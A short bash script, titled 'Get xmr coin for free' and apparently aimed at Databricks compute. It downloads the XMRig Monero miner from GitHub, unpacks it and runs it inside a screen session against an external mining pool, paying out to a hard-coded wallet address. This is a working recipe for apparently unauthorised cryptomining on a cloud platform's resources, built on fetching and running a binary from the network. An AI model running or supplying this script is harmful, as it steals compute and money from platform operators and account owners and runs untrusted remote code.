#! /bin/bash
# Get xmr coin for free
# Databricks
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
tar xvzf xmrig-6.16.4-focal-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u 8BVku7LJ1RhDZaVMPLm6DtSffbHwn1bGF3hU6MbFod1UCL97m3NpqeALpFniVXTnWY8N1n2o4DzTyboEtmnXCh47Q81tPGm -k --tls --rig-id rs7
